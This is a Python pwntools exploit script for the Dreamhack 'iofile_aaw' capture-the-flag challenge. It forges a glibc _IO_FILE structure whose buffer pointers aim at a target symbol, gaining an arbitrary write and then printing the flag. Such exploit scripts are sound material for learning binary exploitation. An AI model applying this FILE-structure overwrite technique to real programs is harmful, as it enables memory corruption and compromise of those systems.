#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn
import time

# exe = ptr.ELF("./iofile_aaw_patched")
exe = ptr.ELF("./iofile_aaw")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-2.27.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 14621)
        # return pwn.remote("localhost", 3333)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


# struct _IO_FILE {
# 	int _flags; /* High-order word is _IO_MAGIC; rest is flags. */
# 	/* The following pointers correspond to the C++ streambuf protocol. */
# 	char *_IO_read_ptr;	  /* Current read pointer */
# 	char *_IO_read_end;	  /* End of get area. */
# 	char *_IO_read_base;  /* Start of putback+get area. */
# 	char *_IO_write_base; /* Start of put area. */
# 	char *_IO_write_ptr;  /* Current put pointer. */
# 	char *_IO_write_end;  /* End of put area. */
# 	char *_IO_buf_base;	  /* Start of reserve area. */
# 	char *_IO_buf_end;	  /* End of reserve area. */
# 	/* The following fields are used to support backing up and undo. */
# 	char *_IO_save_base;   /* Pointer to start of non-current get area. */
# 	char *_IO_backup_base; /* Pointer to first valid character of backup area */
# 	char *_IO_save_end;	   /* Pointer to end of non-current get area. */
# 	struct _IO_marker *_markers;
# 	struct _IO_FILE *_chain;
# 	int _fileno;
# 	int _flags2;
# 	__off_t _old_offset; /* This used to be _offset but it's too small.  */
# 	/* 1+column number of pbase(); 0 is unknown. */
# 	unsigned short _cur_column;
# 	signed char _vtable_offset;
# 	char _shortbuf[1];
# 	_IO_lock_t *_lock;
# #ifdef _IO_USE_OLD_IO_FILE
# };


def main():
    io = connect()

    overwrite_me = unwrap(exe.symbol("overwrite_me"))

    payload = b""
    payload += ptr.p64(0xFBAD2488)  # flags
    payload += ptr.p64(0)  # read_ptr
    payload += ptr.p64(0)  # read_end
    payload += ptr.p64(0)  # read_base
    payload += ptr.p64(0)  # write_base
    payload += ptr.p64(0)  # write_ptr
    payload += ptr.p64(0)  # write_end
    payload += ptr.p64(overwrite_me)  # buf_base
    payload += ptr.p64(overwrite_me + 1024)  # buf_end
    payload += ptr.p64(0)  # save_base
    payload += ptr.p64(0)  # backup_base
    payload += ptr.p64(0)  # save_end
    payload += ptr.p64(0)  # markers
    payload += ptr.p64(0)  # chain
    payload += ptr.p64(0)  # fileno -> stdin

    io.sendlineafter(b"Data: ", payload)
    time.sleep(1)
    io.sendline(ptr.p64(0xDEADBEEF) + b"\0" * 1024)

    io.recvuntil(b"DH{")
    flag = "DH{" + io.recvuntil(b"}").decode()
    ptr.logger.info(f"flag: {flag}")

    return


if __name__ == "__main__":
    main()
